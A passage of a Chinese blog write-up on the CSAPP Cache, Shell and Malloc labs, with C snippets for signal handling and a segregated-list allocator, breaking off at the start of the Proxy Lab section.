+<li>由刚刚计算出的cache规模可知，该cache最多可读入32x32矩阵中的8行数据。故我们可将32x32矩阵以每块8x8的大小分割并转置存放到另一个矩阵中，这样便可以减小cache的miss数，拿到满分。</li>
+<li>同理，该cache最多可读入64x64矩阵的4行数据。故分割64x64矩阵为数个4x4大小的矩阵并转置处理，会较大的降低miss数量。
+<blockquote>
+<p>原先的8x8分割无法使用，原因是这样会产生内部的访问冲突，加大miss数量。<br>
+请注意，倘若按照4x4的大小来分割，则会浪费一半的cache空间，所以这并非64x64矩阵的最优解法，但这是笔者能想到的最优解法。</p>
+</blockquote>
+</li>
+<li>至于61x67矩阵，由于测试程序放宽了miss数量的限制，故将大型矩阵切割为16x16即可满分。</li>
+<li>Part B中限制了临时变量的个数，最多使用12个临时变量。要想进一步降低miss数量，最好单次将一整个缓存行里的数据全部读出到临时变量中，这样该缓存行内的数据一旦被驱逐，下次需要读取数据时就不必再次读入cache，减小miss数。</li>
+<li>笔者最终的代码实现 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/5.%20Cache%20Lab/trans.c" target="_blank" rel="noopener">github</a></li>
+</ul>
+<h3 id="3-测试">3) 测试</h3>
+<ul>
+<li>使用<code>make &amp;&amp; ./driver.py</code>命令进行测试。以下是笔者的测试结果。<br>
+<img src="/2020/07/csapp-lab-writeup/cache_lab_partB.png" alt="img"></li>
+</ul>
+<h2 id="6-Shell-Lab">6. Shell Lab</h2>
+<ul>
+<li>
+<p>在这个Lab中，我们需要完善<code>tsh.c</code>代码，做出一个简单的shell程序。注意，在完成这个Lab前，最好把第八章异常程序控制流的相关内容理解透彻。</p>
+</li>
+<li>
+<p>编写时，有几个点需要注意一下</p>
+<ul>
+<li>
+<p>避免条件竞争。</p>
+<ul>
+<li>
+<p>如果子进程在tsh<code>fork</code>之后、<code>addjob</code>前结束进程，则此时会因为<code>SIGCHLD</code>信号，转去信号处理程序里执行<code>deletejob</code>。</p>
+</li>
+<li>
+<p>此时的执行顺序就变成了<code>deletejob</code>-&gt;<code>addjob</code>，这将会产生一个永远存在的job，即便该job所指定的进程已经终止了。</p>
+</li>
+<li>
+<p>所以我们在执行<code>fork</code>函数前，将一些可能会导致条件竞争的信号阻塞，待<code>addjob</code>执行完成后再来处理信号。</p>
+  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(sigemptyset(&amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"sigemptyset error"</span>);</span><br><span class="line"><span class="keyword">if</span>(sigaddset(&amp;<span class="built_in">set</span>, SIGINT) &lt; <span class="number">0</span> || sigaddset(&amp;<span class="built_in">set</span>, SIGTSTP) &lt; <span class="number">0</span> || sigaddset(&amp;<span class="built_in">set</span>, SIGCHLD) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"sigaddset error"</span>);</span><br><span class="line"><span class="comment">// 在fork前，将SIGCHLD信号阻塞，防止并发错误——_竞争_ 的发生</span></span><br><span class="line"><span class="keyword">if</span>(sigprocmask(SIG_BLOCK, &amp;<span class="built_in">set</span>, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"sigprocmask error"</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>与当前进程一样，<code>fork</code>出的子进程，其被阻塞的信号是相同的，故子进程必须恢复回被阻塞的信号。</p>
+  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((pid = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 子进程的控制流开始</span></span><br><span class="line">  <span class="keyword">if</span>(sigprocmask(SIG_UNBLOCK, &amp;<span class="built_in">set</span>, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      unix_error(<span class="string">"sigprocmask error"</span>);</span><br><span class="line">  <span class="keyword">if</span>(setpgid(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      unix_error(<span class="string">"setpgid error"</span>);</span><br><span class="line">  <span class="keyword">if</span>(execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s: command not found\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>信号不排队</p>
+<ul>
+<li>
+<p>如果有多个子进程同时终止并发出<code>SIGCHLD</code>信号，则tsh主进程只会收到一个信号，而不是多个。</p>
+</li>
+<li>
+<p>原因是当某个类型的信号被阻塞后，新来的相同类型信号会被简单的丢弃。</p>
+</li>
+<li>
+<p>所以在回收子进程时，应使用循环形式尽可能多的回收进程。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sigchld_handler函数中</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">以非阻塞方式等待所有子进程</span></span><br><span class="line"><span class="comment">waitpid 参数3：</span></span><br><span class="line"><span class="comment">    1.     0     ： 执行waitpid时， 只有在子进程 **终止** 时才会返回。</span></span><br><span class="line"><span class="comment">    2. WNOHANG   : 若子进程仍然在运行，则返回0 。</span></span><br><span class="line"><span class="comment">            注意只有设置了这个标志，waitpid才有可能返回0</span></span><br><span class="line"><span class="comment">    3. WUNTRACED : 如果子进程由于传递信号而停止，则马上返回。</span></span><br><span class="line"><span class="comment">            只有设置了这个标志，waitpid返回时，其WIFSTOPPED(status)才有可能返回true</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>只应使<code>SIGCHLD</code>信号处理程序执行<code>waitpid</code>。</p>
+<ul>
+<li>
+<p>该信号处理程序会处理所有子进程的暂停/终止状态，而tsh进程在等待前台进程结束时，只需简单的挂起即可，无需再次执行<code>waitpid</code>。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line">    <span class="keyword">if</span>(!job) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 如果当前子进程的状态没有发生改变，则tsh继续休眠</span></span><br><span class="line">    <span class="keyword">while</span>(job-&gt;state == FG)</span><br><span class="line">        <span class="comment">// 使用sleep的这段代码会比较慢，最好使用sigsuspend</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"waitfg: Process (%d) no longer the fg process\n"</span>, pid);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>否则<code>waitfg</code>、<code>sigchld_handler</code>两边都执行<code>waitpid</code>函数，这可能会造成一些无法预料到的、令人感到迷惑的错误。</p>
+</li>
+</ul>
+</li>
+<li>
+<p>fork出的新子进程需要重新设置进程组号</p>
+<ul>
+<li>原因是当从bash运行tsh时，tsh在bash前台进程组中运行。</li>
+<li>如果tsh随后创建了一个子进程，默认情况下，该子进程也将是bash前台进程组的成员。</li>
+<li>由于输入ctrl-c将向bash前台组中的每个进程发送一个SIGINT，因此该信号会被tsh以及tsh创建的每个进程所接收，这显然是不正确的。</li>
+<li>所以子进程应该调用<code>setpgid(0,0)</code>，这将使子进程放入一个新的进程组中，其中该进程组的ID与子进程的PID相同。这确保bash前台进程组中只有一个进程，即tsh进程。</li>
+<li>当键入ctrl-c时，tsh应该捕获结果SIGINT，然后将其转发到适当的前台进程。</li>
+</ul>
+</li>
+<li>
+<p>当主进程需要暂时挂起时，最好使用<code>sigsuspend</code>挂起，而不是简单的使用<code>sleep</code>，因为<code>sleep</code>的速度过于低下。</p>
+</li>
+<li>
+<p>在信号处理程序中，最好使用<em>原子</em>函数，因为这类函数在执行时不会因为其他信号的触发而被打断。<br>
+以<code>printf</code>函数为例，该函数不推荐在信号处理程序中使用，因为它不是原子类型的函数。<br>
+当执行<code>printf</code>函数时，倘若被另一个信号中断，待从信号中断程序返回并继续执行<code>printf</code>时，<code>printf</code>很有可能会执行失败。</p>
+</li>
+<li>
+<p>发送信号给子进程时，最好发送给子进程所在的进程组。例如发送<code>SIGTSTP</code>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(kill(-pid, SIGTSTP) &lt; <span class="number">0</span>)</span><br><span class="line">  unix_error(<span class="string">"kill (tstp) error"</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><code>sigchld_handler</code>处理<code>SIGCHLD</code>信号时，需要对三类情况分开处理，分别是</p>
+<ul>
+<li>子进程收到暂停信号，还没终止(<code>WIFSTOPPED(status)</code>)</li>
+<li>子进程正常退出/终止(<code>WIFEXITED(status)</code>)</li>
+<li>子进程因为其他信号而异常退出，例如<code>SIGKILL</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>笔者将<code>tshref</code>的源代码（相似度高达98%)存于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/6.%20Shell%20Lab/tsh.c" target="_blank" rel="noopener">github</a>。</p>
+<blockquote>
+<p>由于tsh只是一个较为简单的程序，故编写时仍然使用了一些不被推荐的函数(例如<code>sleep</code>、<code>printf</code>)以降低编写难度。</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="7-Malloc-Lab">7. Malloc Lab</h2>
+<ul>
+<li>在做本实验前，需要先理解<em>虚拟内存</em>那一章中动态内存分配的相关内容</li>
+</ul>
+<h3 id="1-注意点">1) 注意点</h3>
+<blockquote>
+<p>在做malloc lab时，有几个点需要注意一下</p>
+</blockquote>
+<ul>
+<li>
+<p>使用大量宏定义</p>
+<ul>
+<li>指针操作是复杂且容易出错的，可以将指针操作设置为一个宏定义来使用，方便统一管理与修改。</li>
+<li>如果程序需要设置一些输出以方便调试，使用宏定义可以非常方便的打开/关闭这些输出，不必一个个注释。</li>
+<li>使用宏定义<code>assert</code>可以限制程序运行时的一些条件，方便查找错误。</li>
+<li>如果代码编写到一半想更改chunk的结构，最好使用<code>#ifdef、#else、#endif</code>宏定义，这样不仅可以<strong>保留旧的chunk结构</strong>，而且还可以快速从新旧结构中切换，非常方便。
+<blockquote>
+<p>最好将旧的chunk结构保留。<br>
+因为很有可能在编写新结构时发现一个致命错误，从而不得不重新使用旧的结构。</p>
+</blockquote>
+</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALLOC_MASK      1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_FREE_MASK  2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a word at address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p)              (*(unsigned int*)(p))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_RAW_SIZE(p)         (GET(p))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p)             (GET_RAW_SIZE(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_PREV_SIZE(p)        (GET_SIZE((p) - WSIZE))</span></span><br><span class="line"><span class="comment">// 这里的SET_SIZE将会保留最后2位</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_SIZE(p, val)        (GET_RAW_SIZE(p) = (val | (GET_RAW_SIZE(p) &amp; (ALLOC_MASK | PREV_FREE_MASK))))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p)                (GET_RAW_SIZE(p) &amp; ALLOC_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_ALLOC(p)                (GET_RAW_SIZE(p) |= ALLOC_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_FREE(p)              (GET_RAW_SIZE(p) &amp;= ~ALLOC_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_PREV_FREE(p)     (GET_RAW_SIZE(p) &amp; PREV_FREE_MASK )</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_PREV_FREE(p)            (GET_RAW_SIZE(p) |= PREV_FREE_MASK )</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_PREV_ALLOC(p)          (GET_RAW_SIZE(p) &amp;= ~PREV_FREE_MASK )</span></span><br><span class="line"><span class="comment">// footer可以空间复用</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2chunksize(size) \</span></span><br><span class="line">    ((size) &gt; (MIN_CHUNKSIZE - WSIZE) ? ALIGN(size+WSIZE) : MIN_CHUNKSIZE)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FD(p)           (*(void**)((void*)(p) + WSIZE))</span></span><br><span class="line"><span class="comment">// 传入指向fd的指针，传出指向该chunk的header的指针</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FD2HD(p)        ((void*)((void*)(p) - WSIZE))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BK(p)           (*(void**)((void*)(p) + DSIZE))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_CHUNK(p)   ((void*)((void*)(p) + GET_SIZE(p)))</span></span><br><span class="line"><span class="comment">// PREV_CHUNK当且仅当上一个chunk是free chunk才能使用</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_CHUNK(p)   (((void*)(p) - GET_PREV_SIZE(p)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOOTER(p)       (NEXT_CHUNK(p) - WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HD2MEM(p)       ((void*)((void*)(p) + WSIZE))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEM2HD(p)       (FD2HD(p))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// debug专用宏定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DBG(s) assert(s)</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>指针运算</p>
+<ul>
+<li>
+<p>需要注意的是，不同的指针类型与数字运算，可能会偏移不同的字节数。最好将所有指针强制转换为<code>char*</code>或<code>void*</code>类型再操作。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>* ip = <span class="number">0x1100</span>;</span><br><span class="line">ip += <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 此时ip == 0x1104，指针偏移了4个字节（32位环境）</span></span><br><span class="line"><span class="comment">/*******************************/</span></span><br><span class="line"><span class="keyword">void</span>* vp = <span class="number">0x1100</span>;</span><br><span class="line">vp += <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 此时vp == 0x1101，指针偏移了1个字节</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>考虑边界情况</p>
+<ul>
+<li>向前合并时，需要手动对内存布局中第一个chunk进行特殊处理，原因是第一个chunk前<strong>不存在任何chunk</strong>。</li>
+<li>同时，我们还必须针对最后一个chunk做一些特殊处理。因为当某个chunk被释放后，我们需要对该chunk的下一个chunk的<code>PREV_INUSE</code>位进行设置。但如果这个被释放的chunk是最后一个chunk，此时设置<em>下一个chunk</em>的相关位就会产生<code>off by one</code>漏洞，所以需要对最后一个chunk进行特殊处理。</li>
+</ul>
+</li>
+<li>
+<p>内存对齐</p>
+<ul>
+<li><code>mdriver</code>程序会验证<strong>用户空间地址</strong>(不是chunk首地址)是否对齐，因此需要手动在初始化时抬高<code>brk</code>4个字节的空间。</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-思路">2) 思路</h3>
+<blockquote>
+<p>笔者使用了分离适配原则，最终代码存放于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/7.%20Malloc%20Lab/mm.c" target="_blank" rel="noopener">github</a>，下面来简单讲讲思路</p>
+</blockquote>
+<ul>
+<li>
+<p>首先，chunk的结构如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">free chunk的结构</span><br><span class="line">+-------------+</span><br><span class="line">| chunksize|00|   &lt;- chunk size 包含两个标志位，表示当前chunk以及上一个chunk是否使用</span><br><span class="line">+-------------+</span><br><span class="line">|       fd    |   &lt;- 用户所使用的空间，包括对齐的空间。该空间地址以8字节为对齐标准</span><br><span class="line">|       bk    |</span><br><span class="line">|   (padding) |</span><br><span class="line">+-------------+</span><br><span class="line">|  chunksize  |   &lt;- chunk size，无标志位，可空间复用</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>当该chunk被释放，即<code>free chunk</code>，则该chunk的最后4个字节会用于设置当前free chunk的大小，同时设置下一个内存相邻chunk的chunksize部分的<code>PREV_INUSE</code>位。</p>
+</li>
+<li>
+<p>但由于每个free chunk都会设置下一个chunk的相关位，如果内存中最靠后的一个chunk被释放，则会修改尚未分配的内存，这可能会导致<code>off by one</code>漏洞。所以又额外设置了一个<code>top chunk</code>指针，该指针指向内存中最靠后的chunk，该chunk独立管理，不添加进链表中。</p>
+</li>
+<li>
+<p>由于一个chunk中的<code>PREV_INUSE</code>位表明上一个内存相邻chunk的分配情况，故内存中最靠前的chunk的<code>PREV_INUSE</code>位需要额外处理，因为该chunk之前不存在chunk。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 将brk抬高4字节，这样每个chunk的用户空间就满足八字节对齐标准</span></span><br><span class="line">    <span class="comment">// 同时，设置top chunk</span></span><br><span class="line">    <span class="keyword">int</span> topSize = (CHUNKSIZE &gt; MIN_CHUNKSIZE ? CHUNKSIZE : MIN_CHUNKSIZE);</span><br><span class="line">    top_chunk = mem_sbrk(<span class="number">4</span> + topSize) + <span class="number">4</span>;</span><br><span class="line">    SET_SIZE(top_chunk, topSize);</span><br><span class="line">    SET_FREE(top_chunk);</span><br><span class="line">    <span class="comment">// 第一个chunk，设置前面的空间为不可合并</span></span><br><span class="line">    SET_PREV_ALLOC(top_chunk);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>该程序使用分离的链表来管理各个chunk，每个数组中存放两个指针——<code>FD</code>、<code>BK</code>，分别指向链首的chunk和链尾的chunk。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> getListIndx(chunkSize)      \</span></span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">12</span>) ? <span class="number">8</span> :  \</span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">11</span>) ? <span class="number">7</span> :  \</span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">10</span>) ? <span class="number">6</span> :  \</span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">9</span>) ? <span class="number">5</span> :   \</span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">8</span>) ? <span class="number">4</span> :   \</span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) ? <span class="number">3</span> :   \</span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">6</span>) ? <span class="number">2</span> :   \</span><br><span class="line">  (chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">5</span>) ? <span class="number">1</span> :    \</span><br><span class="line">  (chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">4</span>) ? <span class="number">0</span> : <span class="number">-1</span> \</span><br><span class="line">  )))))))</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ChunkSize:</span></span><br><span class="line"><span class="comment">0x10-0x20       2^4</span></span><br><span class="line"><span class="comment">0x20-0x40       2^5</span></span><br><span class="line"><span class="comment">0x40-0x80       2^6</span></span><br><span class="line"><span class="comment">0x80-0x100      2^7</span></span><br><span class="line"><span class="comment">0x100-0x200     2^8</span></span><br><span class="line"><span class="comment">0x200-0x400     2^9</span></span><br><span class="line"><span class="comment">0x400-0x800     2^106</span></span><br><span class="line"><span class="comment">0x800-0x1000    2^11</span></span><br><span class="line"><span class="comment">0x1000-~        2^12</span></span><br><span class="line"><span class="comment">9 bins(void*)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_LIST_NUM 9</span></span><br><span class="line"><span class="keyword">void</span>* heap_listp[HEAP_LIST_NUM][<span class="number">2</span>];</span><br><span class="line"><span class="comment">// top_chunk指向的chunk不存在heap_listp中，同时其指向的chunk一定在堆的最高</span></span><br><span class="line"><span class="keyword">void</span>* top_chunk = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>相关函数的实现</p>
+<ul>
+<li><code>mm_init</code>: 初始化链表、抬高4字节使chunk的用户空间通过8字节对齐标准、手动分配并设置第一块chunk的<code>PREV_INUSE</code>位为0、分配一块超大内存给<code>top_chunk</code>。</li>
+<li><code>mm_malloc</code>: 首先查找各个链表中是否存在所需要的chunk。
+<ul>
+<li>如果有，则断开链表、切割chunk、设置chunk的头部与尾部（只有切割下的chunk会设置尾部）、将剩余chunk放回链表、返回用户地址一条龙。</li>
+<li>如果没有，则判断<code>top chunk</code>的空间是否足够分配
+<ul>
+<li>如果足够，切割top chunk、设置chunk的首尾、重新设置top_chunk、将目标chunk的用户地址返回。</li>
+<li>如果不够，将当前top chunk插入链表中，重新分配一块超大内存给<code>top_chunk</code>指针，之后重新递归执行<code>mm_malloc</code>，返回该递归执行的返回值。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>mm_free</code>: chunk的释放策略非常简单，直接将传入的chunk插入特定索引的链表中即可。插入时自动合并相邻的chunk。</li>
+<li><code>mm_realloc</code>: 该函数先将传入指针的上下两块可能空闲的chunk合并，然后判断当前chunk的大小是否符合需求。
+<ul>
+<li>如果不符合要求，则分配一块新的内存，复制数据，并最后释放旧的chunk</li>
+<li>如果合并后的chunk大小满足需求，则复制数据并切割多余的空间（如果有多余空间的话）。
+<blockquote>
+<p>这里的复制数据最好使用<code>memmove</code>，因为合并后的chunk与原先传入的chunk，其首部可能存在重叠，<code>memmove</code>可以避免这种因为chunk重叠而数据被破坏的错误。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-评分">3) 评分</h3>
+<ul>
+<li>代码编了差不多有两天，但分数一般般，<code>86/100</code>
+<blockquote>
+<p>评分程序中的<code>valid</code>表示是否通过当前测试用例，<br>
+<code>util</code>表示空间利用率，<br>
+<code>ops</code>表示当前测试用例内的所有操作总数，<br>
+<code>secs</code>表示执行当前用例所耗的总时间，<br>
+<code>Kops</code>即<code>Kop/s</code>，表示执行操作的速度，可以间接理解为吞吐量。<br>
+<img src="/2020/07/csapp-lab-writeup/malloc_lab_score.png" alt="img"></p>
+</blockquote>
+<ul>
+<li>主要的失分点在于空间利用率。大部分测试样例的空间利用率都挺高，只有少部分的一些样例需要优化，例如realloc。<br>
+该代码仍然需要针对realloc的测试样例进行更深层次的优化。但编写这个lab的目的在于<strong>更深入的了解动态内存管理机制</strong>，笔者认为已经差不多达到了这个目的，所以没有继续进行优化。</li>
+<li>吞吐量拿到了满分，这可能是因为笔者机器速度比较快，所耗时间比较低。</li>
+</ul>
+</li>
+</ul>
+<h2 id="8-Proxy-Lab">8. Proxy Lab</h2>
+<ul>
+<li>在完成这个lab前，需要先看一下CSAPP中关于网络编程和并发编程的相关内容，同时要理解网络编程那一章中的tiny简易网页服务器的每一行代码。</li>
+</ul>
+<h3 id="1-Part-A-3">1) Part A</h3>
+<ul>
+<li>
+<p>在Part A中，我们要完成以下几个任务</p>
+<ul>
+<li>读取客户端传来的http header</li>
+<li>向http header中添加一些额外的header，例如<code>User-Agent、Host、Connection、Proxy-Connection</code>。如果原来的http header中已经包括了某个header，则不再添加。</li>
+<li>修改客户端传来的http header中的第一行URI。<br>
+例如：修改<code>GET http://localhost:80/index.html HTTP/1.1</code>为<code>GET /index.html HTTP/1.1</code></li>
+<li>将修改好的http header发送给服务器</li>
+<li>将服务器返回的数据转发给客户端</li>
+</ul>
+</li>
+<li>
+<p>这部分内容分值为40分，其实现过程可以参照tiny网页服务器来实现。所设计的数据结构如下</p>
